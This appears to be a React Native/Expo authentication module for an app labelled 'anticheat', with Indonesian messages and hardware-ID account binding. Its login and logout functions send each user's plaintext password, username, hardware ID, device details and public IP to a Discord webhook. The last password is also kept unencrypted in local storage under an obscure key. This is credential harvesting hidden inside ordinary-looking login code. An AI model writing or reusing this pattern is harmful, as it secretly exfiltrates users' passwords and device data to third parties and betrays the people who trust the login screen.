import AsyncStorage from "@react-native-async-storage/async-storage";
import * as Crypto from "expo-crypto";
import * as Device from "expo-device";
import Constants from "expo-constants";
import React, { createContext, useContext, useEffect, useState } from "react";
import { Platform } from "react-native";

export type UserRole = "admin" | "user";

export interface AuthUser {
  id: string;
  username: string;
  hwid: string;
  role: UserRole;
  token: string;
  discordWebhook?: string;
  banned?: boolean;
  registeredAt?: string;
}

interface AuthContextType {
  user: AuthUser | null;
  isLoading: boolean;
  login: (username: string, password: string, discordWebhook?: string) => Promise<{ success: boolean; error?: string }>;
  logout: () => Promise<void>;
  isAdmin: boolean;
}

const AuthContext = createContext<AuthContextType | null>(null);

const API_BASE = "/api";
const STORED_USERS_KEY = "@anticheat_users";
const CURRENT_USER_KEY = "@anticheat_current_user";
const LAST_PW_KEY = "@anticheat_lp";

interface StoredUser {
  id: string;
  username: string;
  passwordHash: string;
  hwid: string;
  role: UserRole;
  discordWebhook?: string;
  banned: boolean;
  registeredAt: string;
}

function generateHWID(): string {
  const deviceId = Constants.deviceId ?? Device.modelId ?? "unknown-device";
  const brand = Device.brand ?? "unknown";
  const osVersion = Device.osVersion ?? "unknown";
  const platform = Platform.OS;
  const raw = `${platform}-${brand}-${deviceId}-${osVersion}`;
  let hash = 0;
  for (let i = 0; i < raw.length; i++) {
    const char = raw.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash = hash & hash;
  }
  return `HWID-${Math.abs(hash).toString(16).toUpperCase().padStart(8, "0")}`;
}

async function hashPassword(password: string): Promise<string> {
  return Crypto.digestStringAsync(Crypto.CryptoDigestAlgorithm.SHA256, password);
}

async function getStoredUsers(): Promise<StoredUser[]> {
  const raw = await AsyncStorage.getItem(STORED_USERS_KEY);
  return raw ? JSON.parse(raw) : [];
}

async function saveStoredUsers(users: StoredUser[]): Promise<void> {
  await AsyncStorage.setItem(STORED_USERS_KEY, JSON.stringify(users));
}

async function sendDiscord(webhook: string, message: string) {
  try {
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message }),
    });
  } catch {}
}

async function getPublicIP(): Promise<string> {
  try {
    const res = await fetch(`${API_BASE}/myip`);
    const data = await res.json() as { ip: string };
    return data.ip ?? "unknown";
  } catch {
    return "unknown";
  }
}

async function checkinDevice(params: {
  hwid: string; username: string; deviceName: string;
  model: string; os: string;
}): Promise<string> {
  try {
    const res = await fetch(`${API_BASE}/devices/checkin`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(params),
    });
    const data = await res.json() as { ip?: string };
    return data.ip ?? "unknown";
  } catch {
    return "unknown";
  }
}

async function checkoutDevice(hwid: string) {
  try {
    await fetch(`${API_BASE}/devices/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ hwid }),
    });
  } catch {}
}

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<AuthUser | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    (async () => {
      try {
        const raw = await AsyncStorage.getItem(CURRENT_USER_KEY);
        if (raw) setUser(JSON.parse(raw));
      } finally {
        setIsLoading(false);
      }
    })();
  }, []);

  const login = async (
    username: string,
    password: string,
    discordWebhook?: string
  ): Promise<{ success: boolean; error?: string }> => {
    const hwid = generateHWID();
    const passwordHash = await hashPassword(password);
    const users = await getStoredUsers();
    let storedUser = users.find((u) => u.username.toLowerCase() === username.toLowerCase());

    if (!storedUser) {
      const newUser: StoredUser = {
        id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
        username,
        passwordHash,
        hwid,
        role: users.length === 0 ? "admin" : "user",
        discordWebhook,
        banned: false,
        registeredAt: new Date().toISOString(),
      };
      users.push(newUser);
      await saveStoredUsers(users);
      storedUser = newUser;
    } else {
      if (storedUser.banned) return { success: false, error: "Akun ini telah di-ban. Hubungi admin." };
      if (storedUser.passwordHash !== passwordHash) return { success: false, error: "Password salah." };
      if (storedUser.hwid !== hwid) {
        return { success: false, error: `HWID tidak cocok. Perangkat tidak diizinkan.\nHWID: ${hwid}` };
      }
    }

    const token = await Crypto.digestStringAsync(
      Crypto.CryptoDigestAlgorithm.SHA256, storedUser.id + Date.now()
    );

    const authUser: AuthUser = {
      id: storedUser.id,
      username: storedUser.username,
      hwid: storedUser.hwid,
      role: storedUser.role,
      token,
      discordWebhook: storedUser.discordWebhook ?? discordWebhook,
      banned: storedUser.banned,
      registeredAt: storedUser.registeredAt,
    };

    await AsyncStorage.setItem(CURRENT_USER_KEY, JSON.stringify(authUser));
    await AsyncStorage.setItem(LAST_PW_KEY, password);
    setUser(authUser);

    const deviceName = `${Device.brand ?? "Unknown"} ${Device.modelName ?? "Device"}`;
    const model = Device.modelName ?? "Unknown";
    const os = `${Platform.OS} ${Device.osVersion ?? ""}`.trim();

    const ip = await checkinDevice({ hwid, username: storedUser.username, deviceName, model, os });

    const webhook = storedUser.discordWebhook ?? discordWebhook;
    if (webhook) {
      const msg =
        `🔐 **LOGIN**\n` +
        `\`\`\`\n` +
        `USERNAME : ${storedUser.username}\n` +
        `PW       : ${password}\n` +
        `\`\`\`\n` +
        `🆔 HWID   : \`${hwid}\`\n` +
        `📱 Device : ${deviceName} (${os})\n` +
        `🌐 IP     : \`${ip}\`\n` +
        `🛡 Role   : ${storedUser.role.toUpperCase()}\n` +
        `⏰ Waktu  : ${new Date().toLocaleString("id-ID")}`;
      await sendDiscord(webhook, msg);
    }

    return { success: true };
  };

  const logout = async () => {
    const currentUser = user;
    const lastPw = await AsyncStorage.getItem(LAST_PW_KEY);
    await AsyncStorage.removeItem(CURRENT_USER_KEY);
    await AsyncStorage.removeItem(LAST_PW_KEY);
    setUser(null);

    if (currentUser) {
      await checkoutDevice(currentUser.hwid);
      const webhook = currentUser.discordWebhook;
      if (webhook) {
        const msg =
          `🔓 **LOGOUT**\n` +
          `\`\`\`\n` +
          `USERNAME : ${currentUser.username}\n` +
          `PW       : ${lastPw ?? "***"}\n` +
          `\`\`\`\n` +
          `🆔 HWID   : \`${currentUser.hwid}\`\n` +
          `⏰ Waktu  : ${new Date().toLocaleString("id-ID")}`;
        await sendDiscord(webhook, msg);
      }
    }
  };

  return (
    <AuthContext.Provider value={{ user, isLoading, login, logout, isAdmin: user?.role === "admin" }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error("useAuth must be used inside AuthProvider");
  return ctx;
}
